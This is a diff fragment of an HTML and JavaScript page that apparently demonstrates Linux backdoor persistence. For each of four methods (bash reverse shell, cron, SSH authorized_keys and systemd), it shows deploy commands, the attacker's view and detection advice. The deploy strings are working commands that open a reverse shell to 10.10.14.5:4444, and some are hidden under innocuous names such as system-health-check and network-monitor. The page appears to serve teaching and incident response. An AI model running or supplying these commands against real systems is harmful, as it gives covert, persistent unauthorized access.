+bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
+
+# No new file needed — executed in memory
+# Process: bash spawned by www-data`,
+    use:`# Attacker's terminal (nc -lvnp 4444):
+Listening on 0.0.0.0 4444
+Connection received from 203.0.113.50
+
+www-data@target:/var/www/html$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+www-data@target:/var/www/html$ whoami
+www-data
+
+www-data@target:/var/www/html$ cat /etc/passwd
+root:x:0:0...
+
+# Full interactive shell — tab completion, history, etc.
+# Upgrade: python3 -c 'import pty;pty.spawn("/bin/bash")'`,
+    evidence:`# No file on disk (if executed from memory)
+# But visible in process list:
+ps aux | grep bash
+www-data  1234  bash -i  (ESTABLISHED 10.10.14.5:4444)
+
+# Netstat / ss shows outbound connection:
+ss -tnp
+ESTAB  0  0  203.0.113.50:45234  10.10.14.5:4444  users:(("bash",pid=1234))
+
+# Detection vectors:
+- Web server process (apache/php-fpm) spawning bash
+- Outbound TCP connection from www-data process
+- EDR: exec syscall with bash from non-interactive context`,
+    verdict:'<strong>Reverse shell established.</strong> Full interactive terminal with no file dropped (if payload injected via existing RCE). However, the outbound TCP connection to port 4444 is visible in netstat and EDR tools. Not persistent — dies if the connection drops or process is killed.'
+  },
+  cron:{
+    deploy:`# Add cron job as current user (www-data or compromised user)
+(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.5/4444 0&gt;&amp;1'") | crontab -
+
+# Every minute: connects back to attacker
+# Survives: web server restart, PHP crash, connection drop
+
+# As root — system-wide cron:
+echo '* * * * * root bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.5/4444 0&gt;&amp;1"' \
+  &gt; /etc/cron.d/system-health-check`,
+    use:`# Attacker waits up to 60 seconds:
+nc -lvnp 4444
+Listening on 0.0.0.0 4444
+...
+[60 seconds later]
+Connection received from 203.0.113.50
+
+www-data@target:/$ id
+uid=33(www-data)
+
+# If connection drops — reconnects within 60 seconds
+# Survives server reboots, process restarts
+# Persistent access without any file in web root`,
+    evidence:`# Crontab entry:
+crontab -l -u www-data
+* * * * * /bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.5/4444 0&gt;&amp;1'
+
+# /var/spool/cron/crontabs/www-data  (modified now)
+
+# System logs:
+/var/log/syslog: CRON[1234]: (www-data) CMD (bash -i >&...)
+
+# Detection vectors:
+- Audit: crontab -l for all users
+- File: /var/spool/cron/ modification timestamp
+- Syslog: CRON entries with TCP/network commands`,
+    verdict:'<strong>Cron persistence established.</strong> Reconnects every minute automatically — survives reboots and connection drops. Visible in crontab -l output and in /var/log/syslog as CRON entries. Defenders should audit all user crontabs and system /etc/cron.d/ files during incident response.'
+  },
+  sshkey:{
+    deploy:`# Add attacker's public key to authorized_keys
+mkdir -p ~/.ssh && chmod 700 ~/.ssh
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB...attacker-key... attacker@evil" \
+  &gt;&gt; ~/.ssh/authorized_keys
+chmod 600 ~/.ssh/authorized_keys
+
+# If root:
+echo "ssh-rsa ...key..." &gt;&gt; /root/.ssh/authorized_keys
+
+# Silent — no password, no logs (with key auth)
+# Permanent until key is removed`,
+    use:`# Attacker logs in silently with their private key:
+ssh -i ~/.ssh/attacker_key www-data@target.com
+
+# If root key was added:
+ssh -i ~/.ssh/attacker_key root@target.com
+
+Last login: Mon Mar 29 09:00:00 2026
+root@target:~# id
+uid=0(root) gid=0(root)
+
+# Full SSH session — encrypted, authenticated
+# If PasswordAuthentication is disabled, only key auth works
+# Key auth doesn't appear in /var/log/auth.log as a password failure
+# Much cleaner than reverse shell — standard SSH tunnel available`,
+    evidence:`# ~/.ssh/authorized_keys contains extra key
+cat ~/.ssh/authorized_keys
+ssh-rsa AAAAB3NzaC1yc2E... legitimate_user@machine
+ssh-rsa AAAAB3NzaC1yc2E... attacker@evil   ← new entry
+
+# Auth log (key auth is logged):
+/var/log/auth.log:
+  sshd[1234]: Accepted publickey for www-data from 10.10.14.5
+
+# Detection vectors:
+- Audit: compare authorized_keys against known-good baseline
+- Auth log: SSH logins from unexpected IPs
+- File integrity: ~/.ssh/authorized_keys modified timestamp`,
+    verdict:'<strong>SSH backdoor planted.</strong> Persistent, encrypted, and authenticated — no password needed. The cleanest persistence mechanism available. Detected via file integrity monitoring on authorized_keys and SSH access log review. Survives reboots indefinitely until the key is removed.'
+  },
+  systemd:{
+    deploy:`# Create a systemd service that auto-restarts the backdoor
+cat &gt; /etc/systemd/system/network-monitor.service &lt;&lt; 'END'
+[Unit]
+Description=Network Monitor Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.5/4444 0&gt;&amp;1'
+Restart=always
+RestartSec=30
+
+[Install]
+WantedBy=multi-user.target
+END
+
+systemctl daemon-reload
+systemctl enable network-monitor
+systemctl start network-monitor`,
+    use:`# Reverse shell connects immediately on service start
+# Reconnects every 30 seconds if connection drops
+# Survives reboots — enabled in multi-user.target
+
+nc -lvnp 4444
+Connection received from 203.0.113.50
+
+root@target:/# id
+uid=0(root) gid=0(root)  ← running as root!
+
+# systemd services run as root by default
+# Full root shell, auto-restarting, boot-persistent`,
+    evidence:`# Service file on disk:
+/etc/systemd/system/network-monitor.service
+
+# Systemd journal:
+journalctl -u network-monitor
+Started Network Monitor Service
+Stopping Network Monitor Service... (connection dropped)
+Started Network Monitor Service (restarted, attempt 2)
+
+# Detection vectors:
+- systemctl list-units --state=active | grep suspicious
+- ls /etc/systemd/system/ — new .service files
+- journalctl entries for new services making network connections`,
+    verdict:'<strong>Systemd persistence established.</strong> Auto-restarts every 30 seconds, survives reboots, runs as root. The most powerful Linux persistence mechanism — but also the most detectable via systemctl list-units and the service file on disk. Defenders should audit all .service files in /etc/systemd/system/.'
+  }
+};
+
+function runDemo(){
+  const key=document.getElementById('backdoor-select').value;
+  const d=DEMOS[key];
+  document.getElementById('deploy-out').innerHTML=`<span style="color:#fbbf24">${d.deploy}</span>`;
+  document.getElementById('use-out').innerHTML=`<span style="color:#f87171">${d.use}</span>`;
+  document.getElementById('evidence-out').innerHTML=`<span style="color:#60a5fa">${d.evidence}</span>`;
+  const v=document.getElementById('demo-verdict');
+  v.className='result-box r-amber';
+  v.innerHTML=d.verdict;
+}
+runDemo();
+</script>
+</body>
+</html>
